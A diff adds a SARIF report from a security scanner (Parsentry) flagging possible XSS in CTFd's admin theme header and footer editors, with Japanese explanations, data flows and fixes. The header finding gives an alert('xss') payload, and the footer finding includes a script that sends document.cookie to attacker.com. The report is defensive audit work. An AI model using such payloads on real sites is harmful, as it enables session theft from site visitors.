@@ -1,0 +1,83 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.14.0",
+          "rules": [
+            {
+              "id": "XSS",
+              "name": "Cross-Site Scripting",
+              "shortDescription": {
+                "text": "Potential XSS vulnerability through theme configuration editor"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Theme header content may be vulnerable to XSS attacks",
+            "markdown": "## テーマヘッダーの XSS 脆弱性\n\n### 問題の説明\nLine 317-325 で `document.getElementById(\"theme-header\")` により、HTMLMixed モードの CodeMirror エディタが初期化されています。このエディタはユーザー入力を受け付け、HTML/CSS コンテンツを管理します。\n\n### PAR フレームワーク分析\n\n**Principal (信頼できない情報源)**\n- ユーザーが CodeMirror エディタを通じて入力するテーマヘッダーHTML\n- サーバーから返されたテーマヘッダー設定値\n\n**Action (セキュリティ制御)**\n- HTMLMixed モードでの直接入力受け入れ\n- バリデーションやサニタイズが見当たらない\n- ユーザー権限チェックなし（管理者のみとしても、XSS は内部脅威になり得る）\n\n**Resource (攻撃対象)**\n- `theme_header_editor.getDoc().setValue(new_css)` (Line 431)\n- サーバー設定として保存される可能性\n- 他のユーザーに配信されるテーマコンテンツ\n\n### データフロー\n```\nユーザー入力 (CodeMirror HTMLMixed) → \ngetValue() 取得 → \nserializeJSON() で JSON化 → \nCTFd.api.patch_config_list() でサーバー送信 → \n他ユーザーが受信・レンダリング → \nXSS 実行\n```\n\n### 攻撃シナリオ\n1. 攻撃者が管理画面にアクセス\n2. テーマヘッダーエディタに悪意ある JavaScript を含むHTML を入力\n3. 例: `<style id=\"theme-color\">\\n<script>alert('xss')</script>\\n</style>`\n4. 設定を保存\n5. 他のユーザーがサイトを訪問時に、テーマヘッダーが注入スクリプトを実行\n\n### 推奨される改善\n1. HTML入力の厳密なバリデーション（ホワイトリストベース）\n2. DOMPurify ライブラリ等を使用したサニタイズ\n3. Content Security Policy (CSP) ヘッダーの導入\n4. 入力の HTML エスケープ処理"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js"
+                },
+                "region": {
+                  "startLine": 317,
+                  "endLine": 325
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.8,
+            "principal": "User-supplied HTML/CSS in theme header via CodeMirror editor",
+            "action": "HTMLMixed mode accepts arbitrary HTML without sanitization or validation",
+            "resource": "Theme configuration stored server-side and delivered to all site visitors",
+            "data_flow": "CodeMirror input → getDoc().setValue() → patch_config_list() API → Server storage → Client-side rendering"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Theme footer content may be vulnerable to XSS attacks",
+            "markdown": "## テーマフッターの XSS 脆弱性\n\n### 問題の説明\nLine 327-335 で `document.getElementById(\"theme-footer\")` により、HTMLMixed モードの CodeMirror エディタが初期化されています。このエディタはユーザーが HTML/CSS コンテンツを自由に編集できます。\n\n### PAR フレームワーク分析\n\n**Principal (信頼できない情報源)**\n- ユーザーが CodeMirror エディタを通じて入力するテーマフッターHTML\n\n**Action (セキュリティ制御)**\n- HTMLMixed モードでの直接入力受け入れ\n- サニタイズやバリデーションが実装されていない\n- 管理者権限チェックのみ（内部脅威に対して無防備）\n\n**Resource (攻撃対象)**\n- テーマフッター設定値\n- サーバー設定として永続化\n- 全サイト訪問者に配信\n\n### データフロー\n```\nユーザー入力 (CodeMirror HTMLMixed) → \ngetValue() 取得 → \nserializeJSON() で JSON化 → \nCTFd.api.patch_config_list() でサーバー送信 → \n全サイト訪問者がフッター HTML をレンダリング → \nXSS 実行\n```\n\n### 攻撃例\n```javascript\n// テーマフッターに入力\n<footer id=\"footer\">\n  <script>\n    // セッションクッキー窃取\n    fetch('https://attacker.com/steal?cookie=' + document.cookie);\n  </script>\n</footer>\n```\n\n### 推奨される改善\n1. HTML のホワイトリストベースの検証\n2. DOMPurify によるサニタイズ\n3. Content Security Policy (CSP) の導入\n4. 出力時のHTMLエスケープ"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js"
+                },
+                "region": {
+                  "startLine": 327,
+                  "endLine": 335
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.8,
+            "principal": "User-supplied HTML/CSS in theme footer via CodeMirror editor",
+            "action": "HTMLMixed mode accepts arbitrary HTML without sanitization",
+            "resource": "Theme footer configuration stored and delivered to all site visitors",
+            "data_flow": "CodeMirror HTMLMixed input → getDoc().setValue() → API serialization → Server storage → Global distribution"
+          }
+        }
+      ]
+    }
+  ]
+}
